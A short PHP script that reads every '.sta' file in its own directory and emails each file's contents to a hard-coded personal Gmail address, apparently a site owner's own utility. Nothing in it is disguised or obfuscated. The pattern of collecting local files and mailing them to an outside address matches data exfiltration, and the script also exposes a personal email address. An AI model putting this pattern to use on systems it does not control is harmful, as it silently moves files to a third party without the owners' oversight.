<?php 
	if ($handle = opendir('.')) {	
		while (false !== ($entry = readdir($handle))) {
			if ($entry != "." && $entry != "..") {

				$split = explode(".",$entry);

				if($split[1] == "sta"){

					$file = fopen($entry,"r");
					$Subject = $entry;
					$message = fread($file,filesize($entry));
					fclose($file);

					$to = 'ashley181291@gmail.com';
					$subject = $entry;
					$headers = "From: ajrobinson.org \r\n";
					mail($to, $subject, $message, $headers);

				}
	        }
	    }
	
	    closedir($handle);
	}
?>

